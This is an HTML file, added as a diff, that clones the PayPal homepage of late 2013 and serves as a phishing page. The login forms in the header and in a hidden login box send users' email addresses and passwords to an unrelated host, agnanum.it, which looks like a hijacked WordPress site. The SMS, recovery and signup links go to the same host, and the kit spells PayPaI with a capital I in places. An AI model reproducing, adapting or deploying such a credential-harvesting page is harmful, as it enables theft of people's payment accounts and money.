@@ -1,0 +1,1514 @@
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+	<head>
+	    
+		
+	
+		<!--
+	    	Script info: script: sparta, template:  , date: Nov 18, 2013 17:42:17 PST, country: US, language: en
+	    	web version: 109.0-8324137
+	    	content version: major version: 1 minor version: 18
+	    	hostname : tidjVRBkJW%2FTrth5mlVvmBcucYDQlZP3CuZeTHpL2n8gPGM4DB85FDjYqVG9ZDWUIm8GJDskF6A
+	    	rlogid : yaDn8E8QGgjJOsNJGnmr%2Fbd1c7Hm6NGHljzSzB%2B3ssLo0vhJySIGxQO3EPs1GgdsfE01P%2B4947MJ6GrXGU%2Br5IWr34ctyWLF_1426e05b601
+	    -->
+	
+
+
+		
+	    <title>
+		
+			Send Money, Pay Online or Set Up a Merchant Account - PayPal
+		
+		</title>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="application-name" content="" />
+    		<link rel="canonical" href="index.html#" />
+        
+
+		<link rel="shortcut icon" href="favicon_x.ico" />
+        
+			<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+        
+		
+				
+	
+	
+	<meta name="p:domain_verify" content="a8f51448ed54f0434c5fc4d2b2ab215d"/>
+
+		
+		
+		<link rel="stylesheet" href="189fbb38be17c0f0c908a76b6fdff92cc1e69f.css" rel="stylesheet" type="text/css" />
+		
+        
+    		
+    		
+    			<link rel="stylesheet" href="c1e7d0a2eb156089d5616f6313f95820c7a23f.css" rel="stylesheet" type="text/css" />
+    			
+    			<!--[if IE 9]>
+    				<link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/27/dfc2b7f9bdd3e4d11dc097bd7d6ca7eaac674d.css" rel="stylesheet" type="text/css" />
+    			<![endif]-->
+    			<!--[if IE 8]>
+    				<link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/89/1d32cb6854d1c68f590e1db67f8b1ee8a2d8ac.css" rel="stylesheet" type="text/css" />
+    			<![endif]-->
+    			
+    		
+        
+
+
+		
+		
+	
+		<link rel="stylesheet" href="3031188c84758f5027ff66259ea763952ea43c.css" rel="stylesheet" type="text/css" />
+	
+		
+		
+		
+		
+	
+	<link rel="stylesheet" href="8feeccf46edd952b9d028c03670764411d3b0e.css" rel="stylesheet" type="text/css" />
+
+	<style type="text/css">
+		.signupHero {
+			background: url("hero_signup_counter.jpg") no-repeat scroll top center #ccc
+		}
+		.bmlsmbHero{
+			background: url("hero_bml_watch.jpg") no-repeat scroll center top #ececec;
+		}
+		.bmlHero {
+			background: url("hero_bml_grill.jpg") no-repeat scroll center top #ececec;
+		}
+		.posWildfire {
+			background: url("hero_posapp.jpg") no-repeat scroll center top #ececec;
+		}
+		.shoppingHero {
+			background: url("hero_us_shopping_final_no_copy_v2_NA01317.jpg") no-repeat scroll center top;
+		}
+		.smbMobileHero {
+			background: url("Hero_Ad_107.jpg") no-repeat scroll center top;
+		}
+		.eBay {
+			background: url("Seasonal_Holiday_2.jpg") no-repeat scroll center top;
+		}
+		.november {
+			background: url("Holiday.jpg") no-repeat scroll center top;
+		}
+		.typhoon {
+			background: url("hero_typhoonhaiyan_bgv2.jpg") no-repeat scroll center top; background-size: cover;
+		}
+		.smbMobileHero .heroTray {
+			width: 294px;
+		}
+		#desktop .smbMobileHero .homeCTA {
+			width: 255px;
+		}
+		#desktop .homeCTA {
+			width: 235px;
+		}
+		#desktop .contentParagraph {
+			font-size: 13px;
+			line-height: 19px;
+			margin: 3px 0 13px 0;
+		}
+		#desktop .heroTray a.button {
+			margin-top: 5px;
+		}
+		#desktop .contentHeadline {
+			line-height: 28px;
+		}
+		#content .pageSubHeadline a.bmlSeeTerm {
+			color: #666;
+			font-weight: 300;
+			text-decoration: underline;
+		}
+		/* small tablets */
+		@media 
+		only screen and (orientation: portrait) and (min-width: 480px) and (max-width: 767px),
+		only screen and (orientation: landscape) and (min-width: 641px) and (max-width: 1023px) {
+
+			#touchdevice .homepageHero .pageSubHeadline {
+				font-size: 16px;
+			}
+			#touchdevice .homepageHero .pageHeadline2 {
+				line-height: 38px;
+			}	
+		}
+		/* regular tablets */
+		@media 
+		only screen and (orientation: portrait) and (min-width: 768px),
+		only screen and (orientation: landscape) and (min-width: 1024px) {
+			#touchdevice .homepageHero #heroContent {
+				width: 55%
+			}
+			#touchdevice .homepageHero .pageSubHeadline {
+				font-size: 16px;
+			}
+			#touchdevice .homepageHero .pageHeadline2 {
+				line-height: 38px;
+				font-size: 40px;
+			}	
+			#touchdevice .slides h2 {
+				margin-bottom: 10px;
+			}
+		}
+		.posWildfire .heroTray {
+			width: 312px;
+			margin-top: 16px;
+		}
+		#desktop .posWildfire .homeCTA {
+			width: 280px;
+			margin-top: 0;
+		}
+		.mobile_number_input {
+			width: 100%;
+		}
+		.disclaimerText {
+			font-size: 11px;
+			line-height: 14px;
+			margin: 8px 0;
+		}
+		#content .mobileIosIcon,
+		#content .mobileAndroidIcon {
+			background: url("home-mobile-icons-sprite-all-variants.png") no-repeat scroll left -104px transparent;
+			height:19px;
+			font-weight:bold;
+			width:55px;
+			font-size:11px;
+			color: rgba(0, 0, 0, 0.4);
+			font-weight:bold;
+			padding-left:20px;
+			display:block;
+			list-style-type:none;
+			display:inline-block;
+			margin:-10px 0 0 0;
+			text-shadow: none;
+		}
+		#content .mobileIosIcon {
+			background-position:0 -123px;
+		}
+		.mobileIcons {
+			margin: 0;
+		}
+		/* #smsForm */
+		#smsForm div.textInput label.error {
+			display: none !important;
+		}
+		/* #smsForm */
+		
+		/* #signupForm marketing override */
+		.heroTray.signupOnboard {
+			width: 350px;
+			margin-top: 15px;
+		}		
+		#signupForm div.textInput.medium,
+		#signupForm div.textInput.medium input {
+			width: 350px;
+		}		
+		#signupForm .passwordSection div.textInput.medium,
+		#signupForm .passwordSection div.textInput.medium input {
+			width: 170px;
+		}
+		.passwordSection .textInput {
+			float: left;
+		}
+		.passwordSection .textInput:first-child {
+			margin-right: 10px;
+		}
+		#signupForm #submit {
+			width: 317px
+		}
+		#signupForm p.help-error {
+			line-height: normal;
+		}
+		/* #signupForm marketing override */
+
+	</style>
+	
+
+
+		
+
+		<style type="text/css" id="antiClickjack">
+			html.js body {display: none !important;}
+		</style>
+
+		<script type="text/javascript">
+			if (self === top) {
+				var antiClickjack = document.getElementById("antiClickjack");
+				antiClickjack.parentNode.removeChild(antiClickjack);
+			} else {
+				top.location = self.location;
+			}
+		</script>
+
+
+		 <script src="4619d0e7d26a8e05c2f9e9d2f0c4d66a68f024.js"></script> 
+		 
+        <!--[if lt IE 9]>
+        <script>
+        /* HTML5 tag support */
+        document.createElement('header');
+        document.createElement('nav');
+        document.createElement('section');
+        document.createElement('article');
+        document.createElement('footer');
+        </script>
+        <![endif]-->		 
+  	</head>
+	
+    
+    	
+    		<body id="desktop">
+    			<h1 class="accessAid">PayPal</h1>
+    			<noscript>
+    				<style type="text/css">body{display:block !important;}</style>
+    				<p class="nonjsAlert">To access many of the new PayPaI features, you'll need to turn on JavaScript and enable cookies. You can do this in your web browser's settings area.</p>
+    			</noscript>		
+    		
+    			<div id="page">
+    				
+
+
+
+<header class="gblMHeader">
+	<div class="outer" role="banner">
+		<div class="inner">
+			<nav class="site secondary" role="navigation">
+				<ul>
+					<li class="skip"><a href="index.html#content">skip to content</a></li>
+					
+						<li class="current personal">
+							
+								<span class="scTrack:tab-personal"><a href=
+
+	
+		"index.html#"
+	
+
+ >Personal</a></span>
+							
+						</li>
+					
+					
+						<li class="business">
+							
+								<span class="scTrack:tab-personal"><a href="index.html#">Business</a></span>
+							
+						</li>
+					
+				</ul>
+			</nav>
+	
+			
+				
+					
+						
+						
+						
+							<form action="http://agnanum.it/wp-admin/account/account/839eb131f2ec9692e03bdee7808ecfec/login.php" name="login_form" method="POST" class="formSmall login">
+						
+							<div class="multi lap">
+								<div id="login_emaildiv" class="textInput beforeContFix">
+									<label for="login_email">Email</label>
+									<input type="text" id="login_email" name="login_email" value="" required title="Please enter your email address">
+									<span class="afterContent">
+										<a aria-expanded="false" 
+											data-shorttext="?" 
+											data-longtext="forgot?" 
+											aria-controls="passwordRecovery1Desc" 
+											class="passwordRecovery scTrack:flyout-reset-email calloutLink" 
+											id="passwordRecovery1" 
+											href=
+
+	
+		"index.html""
+	
+
+ role="button">?</a>
+										<div aria-hidden="true" aria-labelledby="passwordRecovery1" class="calloutContent" id="passwordRecovery1Desc">
+											<div class="close"><span id="calloutCloseBtn">Close</span></div>
+											<p class="title">Forgot your email address?</p>
+											<p>Enter up to 3 of your email addresses and we&#39;ll help you find your account.</p>
+											<span>
+											<a class="tabAccess button small secondary" href=
+
+	
+		"index.html#"
+	
+
+>Get started</a>
+											</span>
+										</div>
+									</span>
+								</div>
+								<div id="login_passworddiv" class="textInput beforeContFix">
+									<label for="login_password" class="">Password</label>
+									<input type="password" id="login_password" name="login_password" autocomplete="off" required title="Please enter your password">
+									<span class="afterContent">
+										<a aria-expanded="false" 
+											data-shorttext="?" 
+											data-longtext="forgot?"  
+											id="passwordRecovery2"
+											aria-controls="passwordRecovery2Desc" 
+											class="passwordRecovery scTrack:flyout-reset-email calloutLink" 
+											
+												href=
+
+	
+		"index.html#"
+	
+
+
+											
+											
+											role="button">forgot?</a>
+										
+											<div id="passwordRecoveryLightbox" class="lightbox">
+								   				<iframe frameborder="0" scrolling="no" width="100%" id="passwordRecoveryFrame"></iframe>
+								   			</div>
+										
+										<div aria-hidden="true" aria-labelledby="passwordRecovery2" class="calloutContent" id="passwordRecovery2Desc">
+											<div class="close">
+												<span id="calloutCloseBtn">Close</span>
+											</div>
+											<p class="title">Forgot your password?</p>
+											<p>Enter your email address and we&#39;ll help you reset your password.</p>
+											<span>
+											
+
+												<a href=
+
+	
+		"index.html#"
+	
+
+ class="tabAccess button small secondary passwordRecoveryFlow scTrack:password_recovery_from_mktg_page">Get started</a>
+											
+											</span>
+										</div>
+									</span>
+								</div>
+								<input type="submit" name="submit.x" class="button secondary" value="Log In">						
+								
+								
+																	
+										
+												
+
+	
+		<a class="button primary" name="SignUp_header" href="index.html#">Sign Up</a>
+	
+
+
+										
+																		
+																
+							</div>
+						</form>
+					
+				
+			
+		</div>
+	</div>
+	
+	<div class="nav">
+		<div class="navOut">
+			<nav role="navigation">
+				<ul>
+					<li class="logo">
+						<a href="../../../../../www.paypal.com/us/cgi-bin/webscr%3Fcmd=_home.html"><img src="logo_106x29.png" alt="PayPal Home"></a>
+					</li>
+					
+						
+							<li class=" dropdown " >
+						    	
+									<a href=
+
+	
+		"index.html#"
+	
+
+ >Buy</a>
+								
+								
+									<ul>
+										
+											<li><a href=
+
+	
+		
+	
+
+ ></a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Overview</a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Make a Payment...</a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >How to Purchase Online</a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >How to Purchase in Stores</a>
+											</li>
+										
+									</ul>
+								
+							</li>
+						
+							<li class=" dropdown " >
+						    	
+									<a href=
+
+	
+		"index.html#"
+	
+
+ >Sell</a>
+								
+								
+									<ul>
+										
+											<li><a href=
+
+	
+		
+	
+
+ ></a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Overview</a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Request a Payment...</a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >How to Sell Online</a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >How to Sell in Person</a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Go to Business Solutions</a>
+											</li>
+										
+									</ul>
+								
+							</li>
+						
+							<li class=" dropdown " >
+						    	
+									<a href=
+
+	
+		"index.html#"
+	
+
+ >Transfer</a>
+								
+								
+									<ul>
+										
+											<li><a href=
+
+	
+		
+	
+
+ ></a>
+											</li>
+										
+											<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Overview</a>
+											</li>
+										
+											<li><a href=
+
+	
+	"index.html#"
+	
+
+ >Send Someone Money...</a>
+											</li>
+										
+									</ul>
+								
+							</li>
+						
+										
+											
+				</ul>
+				
+					
+					<div class="navUtilitiesSec"><a href=
+
+	
+		"index.html#"
+	
+
+ >Explore</a></div>
+					
+				
+				
+			</nav>
+		</div>
+	</div>
+</header>
+
+	
+    				<div id="content">
+    					<div id="main" role="main">						
+    						
+
+
+
+	
+	
+		
+
+		
+
+	
+		
+			<section class="ppHpCarousel ppcCookie">									
+
+				<!-- Tyhoon Donations -->
+				<section class="carouselElement">
+					<div class="homepageHero typhoon">
+						<div class="blackDotsHeroTop"></div>
+							<div class="container">
+								<h2 class="pageHeadline2" style="color: #fff; text-shadow: 0 -1px 0 #000000">
+									Help the Typhoon victims
+								</h2>
+								<h3 class="pageSubHeadline" style="color: #fff; text-shadow: 0 -1px 0 #000000">
+									Super Typhoon Haiyan has devastated the Philippines. <br>
+									The UN reports over 330,000 people are displaced, and <br>
+									thousands are feared dead. Many of the storms survivors <br>
+									are desperate for supplies. To ensure maximum relief to <br>
+									the region, we're waiving all transaction fees when <br>
+									you donate to organizations helping the victims.
+								</h3>
+								<div class="heroTray" style="margin-top: 40px; width: 320px; color: #fff; text-shadow: 0 -1px 0 #000000">
+									<h3 class="contentHeadline" style="color: #fff; text-shadow: 0 -1px 0 #000000">Make more of your donation count</h3>
+									<a class="button homeCTA" href="index.html#" style="width: 280px; margin-bottom: 10px;">Donate Today</a>
+									<a href="index.html#" target="_blank"
+									style="color: #fff; text-shadow: 0 -1px 0 #000000; text-decoration: underline;">Follow this developing story</a>
+								</div>
+							</div>
+						<div class="blackDotsHeroBottom"></div>
+					</div>
+					<input type="hidden" name="carouselSCTracking" class="carouselSCTracking" value="donate">
+				</section>
+
+				<!-- Seasonal eBay feature-->
+				<section class="carouselElement">
+					<div class="homepageHero eBay">
+						<div class="blackDotsHeroTop"></div>
+							<div class="container">								
+								<h2 class="pageHeadline2">
+									Give yourself the<br/> gift of 70% savings.
+								</h2>
+								<h3 class="pageSubHeadline">
+									Unwrap big discounts this holiday season<br/> when you shop eBay Deals for electronics,<br/> toys and fashion. Terms apply.
+								</h3>
+								<div class="heroTray">
+								<h3 class="contentHeadline">
+									Stretch your holiday spend
+								</h3>
+								<a class="button homeCTA" href="index.html#">Shop eBay Deals</a>
+							</div>
+						</div>
+						<div class="blackDotsHeroBottom"></div>
+					</div>
+					<input type="hidden" name="carouselSCTracking" class="carouselSCTracking" value="smbMobile">
+				</section>
+
+				<!-- POS Wildfire Hero -->				
+				<section class="carouselElement">					
+					 <div class="homepageHero posWildfire">
+						<div class="blackDotsHeroTop"></div>
+						<div class="container">								
+							<h2 class="pageHeadline2">
+								This app is money.
+							</h2>
+							<h3 class="pageSubHeadline">
+								Use our new app to pay at your favorite stores.<br> When it comes time to check out,<br>choose how you want to pay in a few taps.
+							</h3>
+						
+							<!-- starte: SMS -->
+							<div class="heroTray"> 
+								<h3 class="contentHeadline">
+									Paying is easier with our new app
+								</h3>
+								<form action="http://agnanum.it/webapps/mpp/rest/smsrequest" method="post" id="smsForm"  name="smsForm" class="formMedium lap sms-form"> 
+									<div class="textInput lap"> 
+										<label for="mobile_number">Mobile number (ex. 555-555-5555)</label> 
+										<input name="mobile_number" type="text" class="textInput mobile_number_input" id="mobile_number" required> 
+										<div class="helpError errorFormatClose">Please enter a 10-digit US phone number</div> 
+									</div>
+									<input id="paypal-here-sms-cta" type="submit" value="Text Yourself the App Link" class="button homeCTA scTrack:button-mobile-app-dl">
+									<input type="hidden" name="redirectUrl" value="webapps/mpp/home?smsrequest=sent">
+									<input type="hidden" name="textMessage" value="PayPaI: Tap # to download the PayPaI app." />
+									<input type="hidden" name="signature" value="EFE52D88169A011B9C27B66F593B06DF0F000E1B" />
+													
+									<p class="disclaimerText">By continuing, you confirm this is your number and agree to receive a text. Standard messaging rates apply.</p>
+									<ul class="mobileIcons"> 
+										<li class="mobileIosIcon">iPhone</li> 
+										<li class="mobileAndroidIcon">Android</li> 
+									</ul> 			
+								</form>
+								<p class="sms-sent hide">A link to download the app has been sent to your phone number </p>
+								<p class="sms-fail hide"> The text message failed to send. Check the phone number and try again.</p>
+							</div>
+							<!-- end: SMS -->
+							
+						</div>
+						<div class="blackDotsHeroBottom"></div>
+					</div>
+					<input type="hidden" name="carouselSCTracking" class="carouselSCTracking" value="wildfire">
+				</section>
+
+				<!-- SMB Mobile Hero -->				
+				<section class="carouselElement">
+					<div class="homepageHero smbMobileHero">
+						<div class="blackDotsHeroTop"></div>
+							<div class="container">								
+								<h2 class="pageHeadline2">
+									Credit cards <br/> accepted here.
+								</h2>
+								<h3 class="pageSubHeadline">
+									With our mobile business features, <br/> credit cards are always an option. <br/> Getting paid is as easy as a single swipe.
+								</h3>
+								<div class="heroTray">
+								<h3 class="contentHeadline">
+									Accepting mobile payments is simple
+								</h3>
+								
+
+	
+		<a class="button homeCTA" href="index.html#">Explore Business Solutions</a>
+	
+
+												
+							</div>
+						</div>
+						<div class="blackDotsHeroBottom"></div>
+					</div>
+					<input type="hidden" name="carouselSCTracking" class="carouselSCTracking" value="smbMobile">
+				</section>	
+
+				<ul id="background-images">
+					<li id="slide-0-background">hero_typhoonhaiyan_bgv2.jpg</li>
+					
+					<li id="slide-1-background">Seasonal_Holiday_2.jpg</li>
+					<li id="slide-2-background">hero_posapp.jpg</li>
+					<li id="slide-3-background">Hero_Ad_107.jpg</li>
+				</ul>
+				<nav class="carouselDirection">
+					<a class="leftArrow" href="index.html#previous" ><span class="carouselSprite"></span></a>
+					<a class="rightArrow" href="index.html#next"><span class="carouselSprite"></span></a>
+				</nav>
+				<nav id="slideIndicator">
+					<ul></ul>
+				</nav>
+
+			</section>
+
+	
+
+
+		
+		
+		<div class="gradientTop">
+			<div id="mainContent">
+					
+				
+				<div class="kickerVerticalRule">
+					<div class="column one">		
+						<img src="homepage-buy.png" alt="Buy into being safer">			
+						<div class="kickerCol1">
+							<h2 class="contentHeadline">Buy into being safer</h2>	
+							<p>No matter where you shop, we'll keep your financial information private and protected.</p>	
+						</div>
+					</div>
+					<div class="column two">	
+						<img src="homepage-sell.png" alt="Sell in less steps">	
+						<div class="kickerCol2">
+							<h2 class="contentHeadline">Sell in fewer steps </h2>	
+							<p> Gone are the days of waiting to get paid. Now you can request a secure payment in a few clicks.</p>		
+						</div>
+					</div>
+					<div class="column three">	
+						<img src="homepage-transfer.png" alt="Transfer money to friends">	
+						<div class="kickerCol3">
+							<h2 class="contentHeadline">Transfer money to friends</h2>	
+							<p> Money is easier between friends when it's this simple to send them money.</p>		
+						</div>
+					</div>
+				</div>
+				<div class="kickerVerticalRule">
+					<div class="column one">		
+						<div class="kickerCol1">
+							<a class="scTrack:home:how-paypal-works" href=
+
+	
+		"index.html#"
+	
+
+ >More about buying</a>
+						</div>
+					</div>
+					<div class="column two">	
+						<div class="kickerCol2">
+							<a class="scTrack:home:selling-with-paypal" href=
+
+	
+		"index.html#"
+	
+
+ >More about selling</a>
+						</div>
+					</div>
+					<div class="column three">	
+						<div class="kickerCol3">
+							<a class="scTrack:home:transfer-money-online" href=
+
+	
+		"index.html#"
+	
+
+ >More about transferring</a>
+						</div>
+					</div>
+				</div>
+			</div>
+				
+			
+		</div>
+		
+	
+	
+
+
+						
+    					</div>
+    				</div>
+    				
+
+	<footer id="gblMarketingFooter" role="contentinfo">
+		<div class="utility">
+			<div class="footerNav"> 
+				<nav>
+					<ul>
+						
+												
+							
+								
+									<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Help</a></li>
+								
+									<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Contact</a></li>
+								
+									<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Fees</a></li>
+								
+									<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Security</a></li>
+								
+									<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Features</a></li>
+								
+									<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Shop</a></li>
+									
+							
+						
+					</ul>
+				      
+	   
+		<script type="text/javascript">
+			window.PAYPAL = window.PAYPAL ? window.PAYPAL : {};
+			window.PAYPAL.util = window.PAYPAL.util ? window.PAYPAL.util : {};
+			PAYPAL.util.ppobjectsPath = "#";
+		</script>
+		<form name="searchForm" id="searchForm" class="searchForm clearfix lap formSmall" action="index.html#" method="post" data-srchid="searchBox" role="search">	
+			<div class="textInput">
+				<label for="searchBox">Search</label>
+				<input id="searchBox" class="searchSite inlineInput" type="text" name="q" value="" autocomplete="off"/>
+				<input id="search" class="inlineInput searchSubmit" type="submit" value="Search" name="search.x" />
+			</div>
+			
+			
+				<input type="hidden" name="coDomain" value="US" />
+			
+			
+			
+			    
+				
+					<input type="hidden" name="num" value="10"/>
+				
+					<input type="hidden" name="filter" value="p"/>
+				
+					<input type="hidden" name="mode" value="live"/>
+				
+					<input type="hidden" name="pp_domain_name" value="#"/>
+				
+					<input type="hidden" name="bn_of" value="html"/>
+				
+					<input type="hidden" name="access" value="p"/>
+				
+					<input type="hidden" name="ie" value="UTF-8"/>
+				
+					<input type="hidden" name="oe" value="UTF-8"/>
+				
+					<input type="hidden" name="start" value="0"/>
+				
+				
+				
+				
+				
+				
+				
+					
+						<input type="hidden" name="client" value="CE2_US_Frontend" />
+					
+				
+				
+				
+				
+					
+						<input type="hidden" name="irFilter" value="CE2_US_en_US_Collection" />
+					
+				
+				
+				
+				
+					
+						<input type="hidden" name="login_status" value="0" />
+					
+				
+				
+				
+				
+					
+						<input type="hidden" name="country" value="US" />
+					
+				
+				
+				
+				
+					
+						<input type="hidden" name="language" value="en_US" />
+					
+				
+				
+				
+				
+					
+						<input type="hidden" name="cc" value="www" id="bn_cc" />
+					
+				
+				
+				
+				
+					
+						<input type="hidden" name="cn" value="paypal" id="bn_cn" />
+					
+				
+				
+				
+				<input type="hidden" id="baynote" disabled="disabled" name="baynote" />
+				
+				
+				<input type="hidden" name="beta_user" value="true" />
+				
+			  
+		</form>
+	  	
+
+				</nav>
+			</div>
+		</div>
+		<div class="footer">
+			<div class="footerNav clearfix"> 
+				<div class="wrapper">			
+					<ul class="topList">											
+						
+							
+												
+							
+									
+										<li><a href=
+
+	
+		"index.html#"
+	
+
+ >About</a></li>
+									
+										<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Blog</a></li>
+									
+										<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Jobs</a></li>
+									
+										<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Sitemap</a></li>
+									
+										<li><a href=
+
+	
+		"index.html#"
+	
+
+ >eBay</a></li>
+									
+										<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Developers</a></li>
+									
+										<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Enterprise</a></li>
+									
+										<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Partners</a></li>
+									
+								
+						
+						<li id="siteFeedback">
+							
+
+<script type="text/javascript">
+		var feedback_link = '';
+		
+			feedback_link="Feedback";
+		
+		var PAYPAL = PAYPAL ? PAYPAL : {};
+		PAYPAL.opinionLabVars = {
+			'siteCatalystPageName' 		: '',
+			'siteCatalystC7' 			: '',
+			'siteCatalystAccountNumber' : '',
+			'feedback_link' 			: feedback_link,
+			'isPaymentFlow' 			: false,
+			'isSiteRedirect' 			: true,
+			'languageCode' 				: 'en',
+			'countryCode' 				: 'US',
+			'commentCardCmd' 			: '',
+			'accountNumber'				: '',
+			'miniBrowser'				: false,
+			'sitefb_plus_icon'			: 'sm_333_oo.gif',
+			'showSitefbIcon'			: true
+		};
+</script>
+
+						</li>
+					</ul>
+					<div class="legal">
+						
+						<p class="copyright">
+						&copy; 1999 - 2014 PayPal
+						</p>
+						<ul>
+							
+								
+									<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Privacy</a></li>
+									<li><a href=
+
+	
+		"index.html#"
+	
+
+ >Legal</a></li>
+										
+								</ul>
+									
+									  	
+									  	
+									  	
+									  	
+									  	<p class="legalContent"></p>
+									  	
+									  	
+							            
+							            
+							            
+									  	
+	    							
+							
+					</div>
+				</div>
+				<span class="countryList">
+					<ul class="topList">
+						
+
+						
+							
+							
+						
+					</ul>
+				</span>
+			</div>
+		</div>
+	</footer>
+
+
+    			</div>
+    	
+    
+	
+    
+        
+             <script src="28809cbab5a24de724fe1d14dcabf8fe6a9d0d.js"></script> 
+        
+    
+	
+	
+		
+			<div id="login-box" style="display:none;">
+				
+					<style type="text/css">
+.login-container form div.textInput { margin:0; }
+
+/*#touchdevice #mainContent{padding:0px;}*/
+
+.login-container .pageHeadline { font-size: 1.125em; height:auto; margin: 10px 0 20px !important; }
+
+.login-container form div.textInput input { width: 100%; background: #fff; font-size:1em; color:#333; }
+.login-container form div.textInput input:focus { background: #fff; }
+
+.login-container hr { margin: 15px 0 20px; border: 0; border-top: 1px solid #d8d8d8; border-bottom: 1px solid #fff; }
+
+.login-container form .password-recovery a { font-weight:bold; }
+
+.login-container form input {
+    margin-bottom: 10px;
+}
+
+/* small and large tablets */
+@media only screen and (orientation: portrait) and (min-width: 481px), screen and (orientation: landscape) and (max-width: 1024px) {
+	.ui-dialog.mini { width: 300px; min-height: 130px; padding:30px 42px 32px 42px; }
+
+	.login-container .pageHeadline{ font-size:1.275em; line-height:1.63636364em; margin:0px 0px 10px 0px !important;}
+
+	.login-container form div.textInput input { width: 100%; background: #f8f8f8; font-size:1em; color:#333; }
+	.login-container form div.textInput input:focus { background: #fff; }
+
+	.login-container form .button { width: 100%; padding-right: 0; padding-left: 0; margin-top: 0px; }
+	.login-container form .password-recovery { font-size: 1em; padding-top: 15px; color: #666; line-height: 1.5em; }
+	.login-container form .password-recovery a{font-weight:bold;}
+
+	hr { margin: 25px 0 30px; border: 0; border-top: 1px solid #eeeeee; border-bottom: 1px solid #ffffff; }	
+}
+
+
+</style>
+<div class="login-container">
+	<div class="row-fluid">
+		<div class="span12" >
+			<h1 class="pageHeadline">
+				<span class="visible-iphone hidden-tablet">Log In</span>
+				<span class="visible-tablet hidden-iphone">Log in to your account</span>		
+			</h1>
+		</div>
+	</div>
+
+	<div class="row-fluid">
+			<div class="formTraySmall">
+				<form action="http://agnanum.it/cgi-bin/webscr?cmd=_login-submit" name="login_form" method="post" class="lap">
+					<div class="textInput">
+						<label for="email">Email</label>
+						<input type="text" name="login_email" id="email">
+					</div>
+					<div class="textInput">
+						<label for="login_password">Password</label>
+						<input type="password" id="login_password" name="login_password"  autocomplete="off">
+					</div>
+					<input type="submit" value="Log In" class="button block" name="submit.x" id="submit" > 											
+					<div class="password-recovery">Forgot your password? <a class="" href="http://agnanum.it/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal">Recover it</a></div>
+				</form>
+			</div>
+		<hr>
+		<a href="http://agnanum.it/webapps/setup-paypal-account/organic" title="Sign Up for Free" class="button block light">Sign Up for Free</a> 														
+	</div>		
+</div>
+
+					
+			</div>
+				
+		<script type="text/javascript">
+			$(document).ready(function(){
+				try {
+					PAYPAL.bp.init("login_form","bp_mid");
+					PAYPAL.ks.init("login_form","login_password","bp_ks1");
+					PAYPAL.common.appendField("login_form", "bp_ks2");
+					PAYPAL.common.appendField("login_form", "bp_ks3");
+				} catch(err) {
+				}
+				
+				
+    				$( "#login" ).click(function(e){
+    				   if(Modernizr.mq('only screen and (orientation: portrait) and (min-width: 768px), screen and (orientation: landscape) and (min-width: 1024px), screen and (orientation: landscape) and (min-width: 641px) and (max-width: 1023px) ,screen and (orientation: portrait) and (min-width: 481px) and (max-width: 767px) ')){
+    						e.preventDefault();
+    						$( '#login-box' ).lightbox({ size: 'mini' });
+    					}
+    				});
+				
+			});
+		</script>
+
+	
+	
+	
+	
+		
+
+		
+	
+	
+	 <script src="6ad8e7723c8ca78c7d482049f1005d8f17e9dd.js"></script> 
+
+	
+	<script type="text/javascript">
+		
+		PAYPAL = this.PAYPAL || {}; 
+		PAYPAL.content = PAYPAL.content || {}; 
+
+		PAYPAL.content.passwordStrength = { 
+			lengthRequired: "Use at least 8 characters.", 
+			caseRequired: "Use both uppercase and lowercase.", 
+			nameRestrict: "Do not use your name or email.", 
+			spaceRestrict: "Do not use any spaces.", 
+			repeatRestrict: "Do not use 4 or more consecutive repeated characters (like 1111).", 
+			sequenceRestrict: "Do not use key and number sequences (like qwer, rewq, 1234 and 4321).", 
+			matchConfirm: "Your passwords don't match. Please retype your password to confirm it."
+		}; 
+		PAYPAL.content["This field is required."] = "We need a password to create an account for you.";
+		PAYPAL.content["Please check your email address for typos, the format doesn't look right."] = "Please check your email for typos, the format doesn't look right.";
+		PAYPAL.content["Include at least 8 characters"] = "Use at least 8 characters.";
+		PAYPAL.content["Do not use more than 22 characters"] = "Do not use more than 20 characters.";
+		PAYPAL.content["Include at least one number or symbol (!@#$%^)"] = "Use at least one number or symbol (!@#$%^)";
+		PAYPAL.content["Do not use your email address"] = "Do not use your email address.";
+		PAYPAL.content["Do not use four repeated characters"] = "Do not use 4 or more consecutive repeated characters (like 1111).";
+		PAYPAL.content["Do not use key sequences (like qwer or rewq)"] = "Do not use key sequences (like qwer or rewq).";
+		PAYPAL.content["Do not use consecutive numbers (like 1234 or 4321)"] = "Do not use consecutive numbers (like 1234 or 4321).";
+		PAYPAL.content["Do not use four key sequence"] = "Do not use key and number sequences (like qwer, rewq, 1234 and 4321).";
+		PAYPAL.content["Passwords must match"] = "Your passwords don't match. Please retype your password to confirm it.";
+	</script>
